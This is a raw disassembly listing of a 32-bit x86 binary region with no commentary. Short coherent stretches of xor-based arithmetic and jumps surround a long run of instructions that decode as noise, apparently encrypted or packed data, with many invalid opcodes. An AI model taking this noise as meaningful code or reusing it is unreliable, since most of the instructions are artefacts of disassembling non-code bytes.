  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fdfa,0x42fd79
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fdfe,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e783,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fe02,0x42fdfe
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e787,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	jno    0x4049a3
  4049bd:	xchg   edx,eax
  4049be:	sahf   
  4049bf:	leave  
  4049c0:	and    DWORD PTR [eax+0x70],esi
  4049c3:	cmp    eax,0xd070707d
  4049c8:	call   0x562d:0x3e4d9909
  4049cf:	sub    al,0xa
  4049d1:	neg    ebx
  4049d3:	or     DWORD PTR [ebx+0x1d],ebx
  4049d6:	jmp    0x8fe7:0x53f28091
  4049dd:	ror    ebx,cl
  4049df:	(bad)  
  4049e0:	push   0xb9d5e28b
  4049e5:	popa   
  4049e6:	pop    eax
  4049e7:	ret    
  4049e8:	shl    BYTE PTR [ebx+eiz*4],1
  4049eb:	xor    BYTE PTR [esi],cl
  4049ed:	test   al,0xe6
  4049ef:	add    BYTE PTR [edx+0x16],bl
  4049f2:	dec    eax
  4049f3:	sub    ebx,0xffffffed
  4049f6:	pop    edi
  4049f7:	cmp    dl,BYTE PTR [ebp-0x35]
  4049fa:	cmp    DWORD PTR [edi],ecx
  4049fc:	out    dx,eax
  4049fd:	sbb    DWORD PTR [esi+0x2a],0x1b2f6cf3
  404a04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a05:	xchg   edx,eax
  404a06:	xchg   edx,eax
  404a07:	call   0x99c4ee4e
  404a0c:	sub    eax,0x626a060c
  404a11:	dec    ebp
  404a12:	rol    DWORD PTR [ebx],cl
  404a14:	hlt    
  404a15:	dec    ebx
  404a16:	shl    BYTE PTR ss:[eax],cl
  404a19:	test   eax,0xbc7d1bc5
  404a1e:	xor    eax,0xdea02ef6
  404a23:	bound  edi,QWORD PTR [eax+0x65]
  404a26:	jne    0x404a16
  404a28:	loopne 0x404a87
  404a2a:	and    eax,0x56888a1d
  404a2f:	cmp    DWORD PTR [eax],esp
  404a31:	sub    dh,BYTE PTR [esi+edx*1+0x114b0f46]
  404a38:	jbe    0x404ab9
  404a3a:	shr    BYTE PTR [esi+eiz*2+0xfaa2b77],cl
  404a41:	pop    edx
  404a42:	mov    bh,0x43
  404a44:	test   al,0x1c
  404a46:	pop    ds
  404a47:	and    eax,0x9a41b3c5
  404a4c:	or     ebx,ecx
  404a4e:	and    BYTE PTR [edi+0x55],dl
  404a51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a52:	inc    ecx
  404a53:	daa    
  404a54:	add    dh,BYTE PTR [ecx-0x2176f19b]
  404a5a:	sub    DWORD PTR [eax-0x68],0xa
  404a5e:	xchg   esp,eax
  404a5f:	add    BYTE PTR [edi],0x55
  404a62:	shl    BYTE PTR [eax+0x1a],cl
  404a65:	nop
  404a66:	dec    edx
  404a67:	cmp    eax,0x7beac213
  404a6c:	push   cs
  404a6d:	popf   
  404a6e:	fstp   TBYTE PTR gs:[ebx+0x2da2f07b]
  404a75:	xchg   ecx,eax
  404a76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a77:	popf   
  404a78:	dec    ebx
  404a79:	dec    esp
  404a7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a7b:	xor    eax,0xdd7b54a2
  404a80:	and    esp,ebx
  404a82:	(bad)  [ecx+ecx*4]
  404a85:	dec    ebx
  404a86:	xchg   BYTE PTR [edx],cl
  404a88:	dec    esi
  404a89:	(bad)
  404a8d:	arpl   WORD PTR [ebp+0x5],bx
  404a90:	adc    BYTE PTR [ebx+eax*1+0x64789444],0xfc
  404a98:	jp     0x404adf
  404a9a:	test   al,0xc7
  404a9c:	pop    eax
  404a9d:	or     eax,edi
  404a9f:	dec    ebp
  404aa0:	mov    DWORD PTR [edi-0x7e],edi
  404aa3:	push   ebx
  404aa4:	icebp  
  404aa5:	loop   0x404b19
  404aa7:	hlt    
  404aa8:	lea    eax,[edi]
  404aaa:	iret   
  404aab:	mov    edx,0xc420cb78
  404ab0:	stos   DWORD PTR es:[edi],eax
  404ab1:	mov    ds,WORD PTR [edi+0x14]
  404ab4:	cmp    eax,0xf0ec1f96
  404ab9:	pop    ebp
  404aba:	dec    esi
  404abb:	jmp    0xd219:0xdd8804cf
  404ac2:	add    esi,DWORD PTR [eax]
  404ac4:	or     BYTE PTR [edi],dl
  404ac6:	int3   
  404ac7:	retf   0x8caa
  404aca:	popf   
  404acb:	ret    
  404acc:	sbb    eax,0x66ea52c0
  404ad1:	add    cl,0x27
  404ad4:	cmp    DWORD PTR [eax],0xffffffbf
  404ad7:	cmp    ch,dh
  404ad9:	loope  0x404b27
  404adb:	xor    ebp,edx
  404add:	cmc    
  404ade:	fdiv   QWORD PTR [ecx]
  404ae0:	cwde   
  404ae1:	mov    ecx,0xfbd50531
  404ae6:	aam    0xeb
  404ae8:	in     al,0x66
  404aea:	jg     0x404aca
  404aec:	mov    eax,0xc0bd8176
  404af1:	and    DWORD PTR [ecx+ecx*2+0x3aa8a373],edx
  404af8:	xor    BYTE PTR [ebx+edx*8],bh
  404afb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404afc:	out    dx,al
  404afd:	xchg   DWORD PTR [ecx-0x7f],ecx
  404b00:	lock mov al,ds:0x13e604ad
  404b06:	push   edi
  404b07:	imul   edi,DWORD PTR ds:0xf3544546,0xffffffdc
  404b0e:	test   al,0x6b
  404b10:	das    
  404b11:	gs stos BYTE PTR es:[edi],al
  404b13:	aaa    
  404b14:	sti    
  404b15:	cmp    dl,al
  404b17:	stc    
  404b18:	add    BYTE PTR [ecx+0x15],bh
  404b1b:	add    BYTE PTR [edi-0xc],bl
  404b1e:	pushf  
  404b1f:	les    eax,FWORD PTR [ecx-0x55987876]
  404b25:	sysexit 
  404b27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b28:	test   DWORD PTR [ebp-0x7a2e7a28],edx
  404b2e:	jmp    0x736573cd
  404b33:	(bad)  
  404b35:	clc    
  404b36:	iret   
  404b37:	neg    DWORD PTR [esi+0x0]
  404b3a:	push   ecx
  404b3b:	xchg   esp,eax
  404b3c:	push   es
  404b3d:	aas    
  404b3e:	mov    ebx,DWORD PTR [edx]
  404b40:	sbb    bh,0x10
  404b43:	ins    DWORD PTR es:[edi],dx
  404b44:	sub    DWORD PTR [eax],0x44
  404b47:	je     0x404b4b
  404b49:	fisub  WORD PTR [edi]
  404b4b:	in     eax,dx
  404b4c:	int3   
  404b4d:	std    
  404b4e:	in     al,0x1
  404b50:	std    
  404b51:	and    DWORD PTR [edi+0x25],0x5f4362fd
  404b58:	dec    eax
  404b59:	fnstenv [edi-0x68]
  404b5c:	leave  
  404b5d:	rcr    ah,0x5
  404b60:	mov    ah,0x32
  404b62:	ss push 0x60335abb
  404b68:	nop
  404b69:	sub    al,0x34
  404b6b:	push   edi
  404b6c:	ss shl ebx,0x18
  404b70:	ins    DWORD PTR es:[edi],dx
  404b71:	lahf   
  404b72:	clc    
  404b73:	jge    0x404bb2
  404b75:	fistp  WORD PTR [ecx-0x3f9ec5ef]
  404b7b:	out    dx,al
  404b7c:	mov    ebx,0x6a508068
  404b81:	jmp    0x404b7e
  404b83:	mov    bh,0x6d
  404b85:	pushf  
  404b86:	jle    0x404bba
  404b88:	int3   
  404b89:	int3   
  404b8a:	jmp    0x404b40
  404b8c:	inc    ecx
  404b8d:	fwait
  404b8e:	retf   0x98d9
  404b91:	popa   
  404b92:	mov    ebp,DWORD PTR [eax+0x772905e9]
  404b98:	add    esi,DWORD PTR [esi]
  404b9a:	ficomp DWORD PTR ds:0xba489967
  404ba0:	jne    0x404b90
  404ba2:	daa    
  404ba3:	jp     0x404c18
  404ba5:	push   esi
  404ba6:	jbe    0x404b4f
  404ba8:	dec    esp
  404ba9:	iret   
  404baa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bab:	ret    0x7f16
  404bae:	or     al,0x54
  404bb0:	pop    ecx
  404bb1:	xor    ah,cl
  404bb3:	xor    al,0x4
  404bb5:	mov    esi,edx
  404bb7:	inc    ebp
  404bb8:	(bad)  
  404bba:	xor    ebp,DWORD PTR [ebx+0x54dc9e68]
  404bc0:	lods   al,BYTE PTR ds:[esi]
  404bc1:	lds    edi,FWORD PTR [ecx]
  404bc3:	stc    
  404bc4:	push   edx
  404bc5:	inc    ebx
  404bc6:	iret   
  404bc7:	shr    DWORD PTR [edi+ecx*4],cl
  404bca:	(bad)  
  404bcb:	adc    BYTE PTR [ecx-0x4f5ddcd2],bl
  404bd1:	scas   al,BYTE PTR es:[edi]
  404bd2:	and    dh,BYTE PTR [edi-0x47]
  404bd5:	push   ds
  404bd6:	imul   ebx,DWORD PTR [edi],0x33
  404bd9:	xchg   BYTE PTR [ecx],ah
  404bdb:	pop    es
  404bdc:	int    0x3d
  404bde:	es (bad) 
  404be0:	lahf   
  404be1:	popa   
  404be2:	xor    DWORD PTR [ebp+0x50],ebp
  404be5:	aam    0x53
  404be7:	mov    WORD PTR [eax+0x541254e6],cs
  404bed:	jne    0x404bf8
  404bef:	push   ebp
  404bf0:	gs xchg edi,eax
  404bf2:	loop   0x404c70
  404bf4:	jno    0x404bff
  404bf6:	js     0x404be3
  404bf8:	fistp  QWORD PTR [edi+0xee958c8]
  404bfe:	ficom  DWORD PTR [esi]
  404c00:	lahf   
  404c01:	or     bh,BYTE PTR [eax+0xe]
  404c04:	lds    edi,FWORD PTR [edi+0x3060adea]
  404c0a:	fstp   TBYTE PTR [eax+0x2e11d9]
  404c10:	jg     0x404c61
  404c12:	(bad)  
  404c13:	imul   ecx,DWORD PTR [edx-0x47fdd712],0x37ab2f2b
  404c1d:	repz push ss
  404c1f:	push   eax
  404c20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c21:	das    
  404c22:	push   ds
  404c23:	cmc    
  404c24:	test   al,0x4
  404c26:	cwde   
  404c27:	mov    ds:0x8c0b39c5,eax
  404c2c:	int    0x7c
  404c2e:	fwait
  404c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c30:	enter  0x854c,0x36
  404c34:	dec    esi
  404c35:	std    
  404c36:	mov    es,WORD PTR [edx]
  404c38:	cmp    dh,BYTE PTR ds:0x1abe341b
  404c3e:	inc    esp
  404c3f:	sub    al,0x2
  404c41:	xchg   ebx,eax
  404c42:	dec    edi
  404c43:	pop    ds
  404c44:	out    dx,eax
  404c45:	sbb    al,0xe8
  404c47:	add    esi,0xffffff94
  404c4a:	xor    al,0x7a
  404c4c:	mov    ds:0x70a0619d,eax
  404c51:	test   BYTE PTR ds:0xd0d5c545,bh
  404c57:	xchg   esi,eax
  404c58:	sub    ch,ch
  404c5a:	out    0x20,al
  404c5c:	jnp    0x404bf0
  404c5e:	xchg   edi,esi
  404c60:	and    BYTE PTR [ebx+esi*2],0xac
  404c64:	repnz dec eax
  404c66:	mul    BYTE PTR [ebp+ecx*2-0x37]
  404c6a:	pop    ds
  404c6b:	cmp    al,0x2d
  404c6d:	mov    eax,0x8139892b
  404c72:	das    
  404c73:	scas   al,BYTE PTR es:[edi]
  404c74:	adc    eax,0x25fe0ae7
  404c79:	fxch   st(2)
  404c7b:	cmp    eax,0xe76674b0
  404c80:	add    al,0x8d
  404c82:	pop    ds
  404c83:	sbb    BYTE PTR [eax-0x24ad46a6],ch
  404c89:	sbb    BYTE PTR [esi],ch
  404c8b:	icebp  
  404c8c:	mov    al,ds:0xf2b8dd68
  404c91:	in     al,0x83
  404c93:	out    0xc4,eax
  404c95:	test   BYTE PTR [ebp+0x6283baad],0xb6
  404c9c:	mov    eax,0xb6974b20
  404ca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ca2:	or     ah,BYTE PTR [ebx+eax*8+0x6a]
  404ca6:	mov    bh,0xaa
  404ca8:	sub    al,ah
  404caa:	(bad)  
  404cab:	ins    DWORD PTR es:[edi],dx
  404cac:	or     eax,0x3add71b8
  404cb1:	loope  0x404cba
  404cb3:	enter  0xe75b,0xf3
  404cb7:	dec    ecx
  404cb8:	lods   eax,DWORD PTR ds:[esi]
  404cb9:	push   esi
  404cba:	jmp    0x543930d8
  404cbf:	push   eax
  404cc0:	arpl   WORD PTR [ebp+esi*2+0x36],bx
  404cc4:	inc    edx
  404cc5:	inc    ebp
  404cc6:	push   edx
  404cc7:	ret    
  404cc8:	sbb    BYTE PTR [ebx+0x7d1153f],0x8
  404ccf:	fwait
  404cd0:	inc    ecx
  404cd1:	repz aas 
  404cd3:	inc    ebp
  404cd4:	(bad)  
  404cd5:	data16 mov cl,0xe6
  404cd8:	jo     0x404c72
  404cda:	scas   eax,DWORD PTR es:[edi]
  404cdb:	push   esi
  404cdc:	popf   
  404cdd:	aaa    
  404cde:	pop    ebx
  404cdf:	adc    bh,BYTE PTR [eax-0x44]
  404ce2:	jb     0x404cdf
  404ce4:	inc    esp
  404ce5:	test   DWORD PTR [eax],0x28aa2c45
  404ceb:	xchg   esi,eax
  404cec:	xor    DWORD PTR [edx],esp
  404cee:	ret    
  404cef:	cli    
  404cf0:	fsub   st,st(3)
  404cf2:	gs into 
  404cf4:	xor    edx,edi
  404cf6:	(bad)  
  404cf8:	cmc    
  404cf9:	mov    eax,ds:0x2b63134c
  404cfe:	sbb    al,BYTE PTR [edx+ecx*1]
  404d01:	lods   eax,DWORD PTR ds:[esi]
  404d02:	rol    DWORD PTR [eax+0x12],0x8e
  404d06:	or     BYTE PTR [ebp-0x38fca276],0xc7
  404d0d:	add    eax,0x42e77f
  404d12:	pop    eax
  404d13:	push   cs
  404d14:	add    BYTE PTR [eax],al
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e76b,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax-0xc]
  404d39:	lock in al,0x2c
  404d3c:	xchg   esi,eax
  404d3d:	cs jo  0x404db0
  404d40:	cmp    eax,0x5270707d
  404d45:	mov    edx,0xf35d577e
  404d4a:	loope  0x404d34
  404d4c:	pop    ss
  404d4d:	sub    eax,DWORD PTR ds:0xfd5537d8
  404d53:	push   0x39943c5
  404d58:	and    cl,BYTE PTR [eax-0x64]
  404d5b:	pcmpgtb mm6,QWORD PTR [edx]
  404d5e:	push   ebx
  404d5f:	ins    BYTE PTR es:[edi],dx
  404d60:	test   eax,0xf0249e80
  404d65:	ins    DWORD PTR es:[edi],dx
  404d66:	pushf  
  404d67:	push   ebp
  404d68:	rol    BYTE PTR [edi+0x27],cl
  404d6b:	scas   al,BYTE PTR es:[edi]
  404d6c:	mov    dl,0x7e
  404d6e:	adc    DWORD PTR [edx+0x62],edi
  404d71:	mov    edi,0xe2fb7e19
  404d76:	daa    
  404d77:	pushf  
  404d78:	mov    al,0x5f
  404d7a:	popa   
  404d7b:	scas   eax,DWORD PTR es:[edi]
  404d7c:	sbb    eax,0x4c7f45c3
  404d81:	(bad)  
  404d82:	mov    dh,0x29
  404d84:	mov    ebp,0xadafdc5c
  404d89:	push   ds
  404d8a:	pop    ebx
  404d8b:	mov    eax,ds:0x370f5f01
  404d90:	ja     0x404db6
  404d92:	retf   
  404d93:	pop    ecx
  404d94:	iret   
  404d95:	push   ds
  404d96:	cwde   
  404d97:	(bad)  
  404d98:	adc    edx,edi
  404d9a:	inc    eax
  404d9b:	out    dx,al
  404d9c:	clc    
  404d9d:	in     al,dx
  404d9e:	xchg   cl,dh
  404da0:	or     DWORD PTR [eax+0x7a75ed6c],edx
  404da6:	and    dh,ah
  404da8:	or     al,0x7
  404daa:	pop    esi
  404dab:	or     ecx,DWORD PTR [esi-0x1affb832]
  404db1:	repz lahf 
  404db3:	(bad)  
  404db4:	loop   0x404dba
  404db6:	push   cs
  404db7:	(bad)  [ebx]
  404db9:	icebp  
  404dba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dbb:	sub    ebp,edx
  404dbd:	mov    WORD PTR [ebx],gs
  404dbf:	xor    BYTE PTR [edx+0x4518dfa8],cl
  404dc5:	jmp    FWORD PTR fs:[esi-0x1c]
  404dc9:	jae    0x404db8
  404dcb:	and    al,0x75
  404dcd:	adc    al,0x9b
  404dcf:	xchg   ebp,eax
  404dd0:	call   0x62483cab
  404dd5:	pop    esp
  404dd6:	sbb    dh,BYTE PTR [ebp+edx*1+0x606fe391]
  404ddd:	out    0x9,eax
  404ddf:	add    dh,BYTE PTR [edi]
  404de1:	pushf  
  404de2:	adc    ecx,DWORD PTR [esi+0x6ac2cf88]
  404de8:	mov    ds:0xfde182bc,al
  404ded:	not    DWORD PTR [esi-0x2e]
  404df0:	mov    dl,0x8
  404df2:	or     eax,0xce309c2c
  404df7:	rcl    edx,0x2d
  404dfa:	shl    DWORD PTR [esp+eax*1+0x7f262a8],1
  404e01:	fnstenv [edi]
  404e03:	inc    ecx
  404e04:	mov    dh,0x11
  404e06:	inc    esi
  404e07:	stos   BYTE PTR es:[edi],al
  404e08:	jns    0x404de6
  404e0a:	xchg   ah,dh
  404e0c:	jl     0x404e11
  404e0e:	mov    ch,BYTE PTR [esi]
  404e10:	jno    0x404df6
  404e12:	add    bl,BYTE PTR [ecx-0x13d1a2c7]
  404e18:	dec    edx
  404e19:	lahf   
  404e1a:	mov    ds,WORD PTR [edi+0xf]
  404e1d:	out    dx,eax
  404e1e:	mov    esi,0xabc4e73a
  404e23:	(bad)  
  404e25:	shr    DWORD PTR [eax],cl
  404e27:	inc    edx
  404e28:	and    DWORD PTR [esp+edx*2+0x46],ebp
  404e2c:	ss mov al,0xda
  404e2f:	xor    eax,0xe7200b3b
  404e34:	adc    DWORD PTR [edx+0x6f0d3560],0x7e
  404e3b:	ja     0x404e4a
  404e3d:	sub    DWORD PTR [ecx],edi
  404e3f:	call   DWORD PTR gs:[ecx+0x55]
  404e43:	cmp    eax,0xaa1954be
  404e48:	out    0x73,al
  404e4a:	retf   
  404e4b:	imul   eax,esi,0xffffffa3
  404e4e:	xor    DWORD PTR [ecx-0x4f],ebx
  404e51:	mov    dh,0x9f
  404e53:	pusha  
  404e54:	mov    bl,0xd7
  404e56:	pop    ecx
  404e57:	or     edi,edi
  404e59:	add    dl,cl
  404e5b:	aad    0x85
  404e5d:	data16 fld QWORD PTR [esi+0xa]
  404e61:	add    cl,BYTE PTR [esi]
  404e63:	pusha  
  404e64:	mov    esp,0x4f2b162d
  404e69:	lahf   
  404e6a:	mov    esi,0x76fd487a
  404e6f:	mov    ebp,0x5f19960f
  404e74:	dec    edx
  404e75:	imul   ecx,edx,0x9c0efb85
  404e7b:	inc    edi
  404e7c:	jmp    0x40501a4f
  404e81:	fwait
  404e82:	xlat   BYTE PTR ds:[ebx]
  404e83:	hlt    
  404e84:	jp     0x404e2a
  404e86:	sbb    bh,dl
  404e88:	mov    dl,0x71
  404e8a:	aam    0x42
  404e8c:	fld    TBYTE PTR [ebp-0x2]
  404e8f:	push   esp
  404e90:	cmp    dh,dl
  404e92:	(bad)  
  404e93:	in     eax,dx
  404e94:	inc    esi
  404e95:	sbb    cl,BYTE PTR [ebx]
  404e97:	jb     0x404e50
  404e99:	es enter 0xaafa,0xee
  404e9e:	mov    ds:0x22a7a34,eax
  404ea3:	outs   dx,DWORD PTR ds:[esi]
  404ea4:	test   cl,0x1c
  404ea7:	jbe    0x404ed9
  404ea9:	or     BYTE PTR [ecx-0x40da88bc],0x14
  404eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404eb1:	push   ds
  404eb2:	sbb    bl,BYTE PTR [ebx-0x5ceb32a0]
  404eb8:	push   ebp
  404eb9:	adc    eax,0x8a8d159b
  404ebe:	push   ss
  404ebf:	ret    0x4c5e
  404ec2:	fisttp DWORD PTR [ecx+ecx*4+0xcc035c6]
  404ec9:	mov    esi,0xeb6a9e0c
  404ece:	mov    ch,0xb8
  404ed0:	rol    DWORD PTR [edx+0x23],1
  404ed3:	xchg   ebp,eax
  404ed4:	or     al,0x10
  404ed6:	cmovb  edi,DWORD PTR [edi-0x7a17a35d]
  404edd:	push   eax
  404ede:	(bad)  
  404edf:	bnd jle 0x404f15
  404ee2:	and    DWORD PTR [esp+eax*4],ebp
  404ee5:	add    al,0xed
  404ee7:	sub    al,0x32
  404ee9:	rcl    BYTE PTR [ebx+0x4],0x9c
  404eed:	xchg   edi,eax
  404eee:	inc    edx
  404eef:	or     eax,DWORD PTR [edi+0xdf133fe]
  404ef5:	mov    ds,WORD PTR [edi-0x4e]
  404ef8:	leave  
  404ef9:	inc    ebp
  404efa:	inc    ecx
  404efb:	inc    ecx
  404efc:	mov    al,ds:0xda02421
  404f01:	rcr    DWORD PTR gs:[eax-0x40],1
  404f05:	in     al,0x3c
  404f07:	call   0x775b:0x99e0c66a
  404f0e:	cld    
  404f0f:	psubd  mm6,mm4
  404f12:	dec    ebx
  404f13:	shl    BYTE PTR [ebx+ebp*8-0xd],cl
  404f17:	sar    bh,1
  404f19:	jns    0x404eb3
  404f1b:	pop    esi
  404f1c:	and    DWORD PTR [ebx+edi*4+0x18],edx
  404f20:	std    
  404f21:	dec    edx
  404f22:	push   ebp
  404f23:	sbb    DWORD PTR [esi+0x4c15faad],ebx
  404f29:	pop    ebx
  404f2a:	cmp    BYTE PTR [edi-0x6e7de15b],ch
  404f30:	add    edx,DWORD PTR [edx+0x5a]
  404f33:	jmp    0xe3daeda8
  404f38:	mov    edi,0xe836c510
  404f3d:	pop    ebp
  404f3e:	jg     0x404eda
  404f40:	ins    BYTE PTR es:[edi],dx
  404f41:	out    dx,al
  404f42:	jb     0x404f8b
  404f44:	or     esi,DWORD PTR [edi-0x72]
  404f47:	xor    al,0xad
  404f49:	mov    bl,0xa0
  404f4b:	add    esp,DWORD PTR [ebp-0x3dbce222]
  404f51:	or     al,0x38
  404f53:	cmc    
  404f54:	lock leave 
  404f56:	xlat   BYTE PTR ds:[ebx]
  404f57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f58:	and    ah,al
  404f5a:	mov    esp,0x7dc97d7d
  404f5f:	cmp    eax,0x5e3f00c3
  404f64:	call   0x8f62ddc
  404f69:	fst    st(6)
  404f6b:	jle    0x404f2d
  404f6d:	or     DWORD PTR [edi+0x655e2d9d],ebp
  404f73:	ins    BYTE PTR es:[edi],dx
  404f74:	mov    eax,ds:0x776c18eb
  404f79:	pop    esi
  404f7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f7b:	daa    
  404f7c:	rcr    BYTE PTR [edi-0x27],1
  404f7f:	les    edx,FWORD PTR [ebx+0x46]
  404f82:	add    ecx,DWORD PTR [edx]
  404f84:	(bad)  [edx-0x16]
  404f87:	jo     0x404fc3
  404f89:	call   0x3f22:0xd7c5cc3c
  404f90:	jp     0x404fd9
  404f92:	push   ebp
  404f93:	(bad)  
  404f94:	jmp    0x897e17af
  404f99:	in     al,0xfc
  404f9b:	inc    edi
  404f9c:	pop    ecx
  404f9d:	int3   
  404f9e:	mov    ds:0x8c3a3df1,al
  404fa3:	imul   ebp,edi,0xc153bd0a
  404fa9:	adc    esp,ebp
  404fab:	mov    BYTE PTR [edx+0x1e86969f],al
  404fb1:	out    0x34,al
  404fb3:	adc    DWORD PTR [eax-0x7c],esi
  404fb6:	ret    0xca60
  404fb9:	dec    esp
  404fba:	gs add eax,0x3c2b04ed
  404fc0:	or     esi,esi
  404fc2:	xor    eax,0x68f1409d
  404fc7:	sub    al,ch
  404fc9:	inc    edi
  404fca:	daa    
  404fcb:	mov    al,0xdc
  404fcd:	ds popa 
  404fcf:	xor    eax,0x52865d78
  404fd4:	lds    esp,FWORD PTR [ecx]
  404fd6:	ret    0xbf62
  404fd9:	call   0xf63e:0x2ad2c76c
  404fe0:	sub    al,0x97
  404fe2:	adc    al,0xee
  404fe4:	add    esi,DWORD PTR [edx]
  404fe6:	sub    ch,BYTE PTR [edx-0x27]
  404fe9:	mov    edx,0xaf80e244
  404fee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ff0:	dec    edi
  404ff1:	outs   dx,BYTE PTR ds:[esi]
  404ff2:	add    DWORD PTR [esi-0x78eeb85d],eax
  404ff8:	jo     0x405016
  404ffa:	mov    cl,0x84
  404ffc:	pop    esi
  404ffd:	add    ch,bh
  404fff:	xor    edx,DWORD PTR [ecx-0x59d8a0a0]
  405005:	gs fdivrp st(7),st
  405008:	ins    DWORD PTR es:[edi],dx
  405009:	push   esp
  40500a:	jo     0x404f9f
  40500c:	jb     0x40505f
  40500e:	push   ebx
  40500f:	push   ebp
  405010:	dec    esp
  405011:	or     DWORD PTR [ebp-0x26ea39b3],edx
  405017:	mov    al,ds:0xf286443b
  40501c:	or     eax,0x5b1fc6e1
  405021:	loope  0x40504d
  405023:	or     eax,0x35c07e93
  405028:	xchg   BYTE PTR [ecx+0x39],cl
  40502b:	xlat   BYTE PTR ds:[bx]
  40502d:	adc    BYTE PTR [esi+0x841628b],ah
  405033:	and    DWORD PTR [ebx+0x1a],eax
  405036:	xor    eax,DWORD PTR [eax]
  405038:	repz ss dec esi
  40503b:	jp     0x4050ba
  40503d:	mov    al,0xd9
  40503f:	pavgw  mm7,QWORD PTR [esi+0x2e]
  405043:	cld    
  405044:	div    ah
  405046:	addr16 xor al,0x73
  405049:	jg     0x40505b
  40504b:	inc    esp
  40504c:	rol    BYTE PTR [edi+eax*4],1
  40504f:	add    eax,0xef455f38
  405054:	test   al,0x5a
  405056:	pop    esp
  405057:	pusha  
  405058:	sub    DWORD PTR [esi-0x63],esp
  40505b:	ret    0xd3ab
  40505e:	dec    ebx
  40505f:	inc    edx
  405060:	pop    ebp
  405061:	(bad)  
  405063:	xchg   edx,eax
  405064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405065:	mov    edx,0x8f5fbb9c
  40506a:	mov    ebx,0xe7d40202
  40506f:	or     DWORD PTR [esi+edi*1],0xeaacc6d1
  405076:	aaa    
  405077:	xor    BYTE PTR [ebp-0x4f],bh
  40507a:	aas    
  40507b:	ins    DWORD PTR es:[edi],dx
  40507c:	(bad)  
  40507d:	ret    0xa5bb
  405080:	and    eax,0x7831c8d1
  405085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405086:	dec    DWORD PTR [ebx+0x3b42f445]
  40508c:	ror    BYTE PTR [edi],1
  40508e:	test   DWORD PTR [edx+0x5ffffff8],ebp
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	rcl    DWORD PTR [eax+0x2b],0xeb
  405134:	les    edx,FWORD PTR [ebx+0x2b]
  405137:	jo     0x4051a9
